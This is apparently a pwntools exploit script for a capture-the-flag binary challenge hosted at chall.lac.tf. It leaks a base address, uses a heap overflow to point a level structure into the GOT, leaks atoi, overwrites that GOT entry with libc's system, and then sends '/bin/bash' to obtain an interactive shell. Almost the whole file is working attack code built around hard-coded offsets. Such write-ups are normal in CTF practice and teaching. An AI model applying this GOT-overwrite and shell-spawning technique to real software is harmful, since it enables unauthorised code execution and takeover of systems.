#!/user/bin/env python3

from pwn import *

NAME = 'chall/chall'
PORT = 31338
URL = 'chall.lac.tf'
FLAGFILE = 'chall/flag.txt'

# Configuration settings for the script to launch GDB in the container
TERMINAL_CONFIG = ['tmux', 'split-window', '-h', '-F', '#{pane_pid}', '-P']

context.binary = ELF(NAME)
context.terminal = TERMINAL_CONFIG

LIBC = ELF('chall/libc.so.6')
LD = ELF('chall/ld-linux-x86-64.so.2')
ENV = {"LD_PRELOAD": LIBC.path}

START_OFS = 0x4080
PREV_OFS = 0x4088
CURR_OFS = 0x4090

MAIN_OFS = 0x1662
ATOI_GOT_OFS = 0x4038
RESET_OFS = 0x14a4
CREATE_LEVEL_RET_OFS = 0x12df

ATOI_LIBC_OFS = 0x3d4a0
SYSTEM_LIBC_OFS = 0x4c490

GDB_COMMAND = f'''
breakrva {CREATE_LEVEL_RET_OFS} /ctf/chall/chall
set $startofs = {START_OFS}
set $prevofs = {PREV_OFS}
set $currofs = {CURR_OFS}
continue
'''

def create_flag(flag_path):
    write(flag_path, 'THIS_IS_THE_FLAG' * 4 + '\n')

# Create target process or connect to remote
if args['REMOTE']:
    log.warning('This challenge requires that you start the remote instance.\n'
                'Ensure that the domain and port used in this script with '
                'the remote instance')
    p = remote(URL, PORT)
elif args['GDB']:
    create_flag(FLAGFILE)
    #p = gdb.debug([LD.path, context.binary.path], gdbscript=GDB_COMMAND, env=ENV)
    p = gdb.debug(context.binary.path, gdbscript=GDB_COMMAND, env=ENV)
else:
    create_flag(FLAGFILE)
    p = process([LD.path, context.binary.path], env=ENV)

p.recvuntil(b'gift: ')
main_addr = p.recvuntil(b'\n').strip()[2:]
print(main_addr)
main_addr = unhex(main_addr)
main_addr = unpack(main_addr, 'all', endian='big')
base_addr = main_addr - MAIN_OFS
print(hex(base_addr))

# Create two adjacent chunks, Control and Victim (start->next[0] and
# start->next[1]) (and a third just to increment prev)
p.recvuntil(b'Choice: ')
p.sendline(b'1')    # Create level
p.recvuntil(b'index: ')
# Level index 0
p.sendline(b'0')

p.recvuntil(b'Choice: ')
p.sendline(b'1')    # Create level
p.recvuntil(b'index: ')
# Level index 1
p.sendline(b'1')

p.recvuntil(b'Choice: ')
p.sendline(b'1')    # Create level
p.recvuntil(b'index: ')
# Level index 2
p.sendline(b'2')

# Change curr to Control chunk (start->next[0]) and overwrite Victim chunk
# with address 0x40 bytes before atoi GOT address
atoi_addr = base_addr + ATOI_GOT_OFS
PADDING1 = b'a' * 0x20
PADDING2 = b'b' * 0x10
TARGET_ADDR = p64(atoi_addr-0x40)
PADDING3 = b'c' * (0x10-1)
PAYLOAD = PADDING1 + PADDING2 + TARGET_ADDR + PADDING3

# set curr to start->next[0]
p.recvuntil(b'Choice: ')
p.sendline(b'4')    # Explore
p.recvuntil(b'index: ')
p.sendline(b'0')

# overwrite into start->next[1]
p.recvuntil(b'Choice: ')
p.sendline(b'2')    # Edit level
p.recvuntil(b'data: ')
p.send(PAYLOAD)
p.sendline(b'')

# Reset to curr = start
p.recvuntil(b'Choice: ')
p.sendline(b'5')    # Reset
#p.sendline(b'5')    # Reset

# Change 'curr' to Victim chunk
# Change to start->next[1] (corrupted)
# Change to curr->next[0] (GOT entry)

# Set curr = start->next[1] (victim)
p.recvuntil(b'Choice: ')
p.sendline(b'4')    # Explore
p.recvuntil(b'index: ')
p.sendline(b'1')    # Change curr to start->next[1]

# Set curr = start->next[1]->next[0] (in GOT)
p.recvuntil(b'Choice: ')
p.sendline(b'4')    # Explore
p.recvuntil(b'index: ')
p.sendline(b'0')    # Change curr to start->next[1]->next[0]

# Leak atoi address from GOT with 'test_level'
p.recvuntil(b'Choice: ')
p.sendline(b'3')
p.recvuntil(b'data: ')
leaked = p.recvuntil(b'\n')
addr_atoi_bytes = leaked[:8]
addr_atoi = unpack(addr_atoi_bytes, 'all')
print(f'&atoi: {hex(addr_atoi)}')

# Calculate address of system.
libc_base = addr_atoi - ATOI_LIBC_OFS
addr_system = libc_base + SYSTEM_LIBC_OFS
PAYLOAD2 = p64(addr_system)

# Overwrite atoi address in GOT to &system with 'edit_level' (this has
# side-effect of mangling address of exit in the GOT)
p.recvuntil(b'Choice: ')
p.sendline(b'2')    # Edit level
p.recvuntil(b'data: ')
p.sendline(PAYLOAD2)

# Send `/bin/bash` at next menu prompt
p.sendline(b'/bin/bash')

p.interactive()
